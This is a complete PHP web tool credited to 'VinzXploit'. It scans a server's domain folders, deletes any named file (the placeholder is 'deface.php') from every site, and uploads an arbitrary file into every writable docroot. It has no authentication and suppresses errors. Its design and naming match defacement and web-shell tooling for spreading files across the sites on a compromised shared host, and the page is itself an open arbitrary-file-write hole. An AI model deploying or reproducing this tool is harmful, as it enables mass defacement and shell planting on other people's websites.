 <?php
/* 
 * Mass Domain Cleaner & Uploader
 * Fixed version (auto docroot, real validation)
 * Use at your own server only
 */

error_reporting(0);
set_time_limit(0);

/* ---------- FUNCTIONS ---------- */

function getDomains($baseDir) {
    $domains = [];
    if (!is_dir($baseDir)) return $domains;

    foreach (scandir($baseDir) as $d) {
        if ($d == '.' || $d == '..') continue;
        $path = rtrim($baseDir, '/') . '/' . $d;
        if (is_dir($path)) {
            $domains[] = $path;
        }
    }
    return $domains;
}

function detectDocRoot($domainPath) {
    $candidates = ['public_html', 'public', 'www'];
    foreach ($candidates as $c) {
        if (is_dir($domainPath . '/' . $c)) {
            return $domainPath . '/' . $c;
        }
    }
    return $domainPath; // fallback root domain
}

function scanAndDelete($dir, $target, &$log) {
    if (!is_dir($dir)) return;

    $files = scandir($dir);
    foreach ($files as $f) {
        if ($f == '.' || $f == '..') continue;
        $path = $dir . '/' . $f;

        if (is_dir($path)) {
            scanAndDelete($path, $target, $log);
        } else {
            if ($f === $target) {
                if (is_writable($path) && unlink($path)) {
                    $log[] = "[DELETED] $path";
                } else {
                    $log[] = "[FAILED ] $path";
                }
            }
        }
    }
}

function massUpload($tmpFile, $filename, $domains, &$log) {
    $temp = sys_get_temp_dir() . '/' . uniqid('upload_');
    if (!move_uploaded_file($tmpFile, $temp)) {
        $log[] = "[ERROR] Failed move_uploaded_file";
        return;
    }

    foreach ($domains as $d) {
        $docroot = detectDocRoot($d);
        if (!is_writable($docroot)) {
            $log[] = "[SKIP] Not writable: $docroot";
            continue;
        }

        $target = $docroot . '/' . $filename;
        if (copy($temp, $target) && file_exists($target)) {
            $log[] = "[UPLOADED] $target";
        } else {
            $log[] = "[FAILED ] $target";
        }
    }

    unlink($temp);
}

/* ---------- HANDLE REQUEST ---------- */

$log = [];
$domains = [];

if (!empty($_POST['base_dir'])) {
    $domains = getDomains(trim($_POST['base_dir']));
}

if (isset($_POST['delete_file']) && !empty($_POST['filename'])) {
    foreach ($domains as $d) {
        $docroot = detectDocRoot($d);
        scanAndDelete($docroot, $_POST['filename'], $log);
    }
}

if (isset($_POST['upload_file']) && isset($_FILES['upfile'])) {
    massUpload(
        $_FILES['upfile']['tmp_name'],
        $_FILES['upfile']['name'],
        $domains,
        $log
    );
}
?>

<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Mass Domain Cleaner</title>
<style>
body{background:#0f1220;color:#eaeaff;font-family:monospace}
.container{width:90%;margin:20px auto}
input,button{padding:8px;background:#1c1f3a;color:#fff;border:1px solid #444}
button{cursor:pointer}
textarea{width:100%;height:200px;background:#0b0e1a;color:#7CFC00}
.box{border:1px solid #333;padding:15px;margin-bottom:15px}
h2{color:#7aa2ff}
</style>
</head>
<body>

<div class="container">
<h2>Tools Mass, Created by VinzXploit</h2>

<form method="post" enctype="multipart/form-data">
<div class="box">
<b>1️⃣ Masukan directory utama domain</b><br>
<input type="text" name="base_dir" placeholder="/home/username/" style="width:60%" required>
<button type="submit">Scan Domain</button>
</div>

<?php if ($domains): ?>
<div class="box">
<b>📂 Domain ditemukan:</b><br>
<textarea readonly><?php
foreach ($domains as $d) {
    echo $d . " -> " . detectDocRoot($d) . "\n";
}
?></textarea>
</div>

<div class="box">
<b>2️⃣ Mass Delete File</b><br>
<input type="text" name="filename" placeholder="deface.php">
<button type="submit" name="delete_file">Delete</button>
</div>

<div class="box">
<b>3️⃣ Mass Upload File</b><br>
<input type="file" name="upfile">
<button type="submit" name="upload_file">Upload</button>
</div>
<?php endif; ?>

<?php if ($log): ?>
<div class="box">
<b>📜 Result:</b>
<textarea readonly><?php echo implode("\n", $log); ?></textarea>
</div>
<?php endif; ?>

</form>
</div>

</body>
</html>
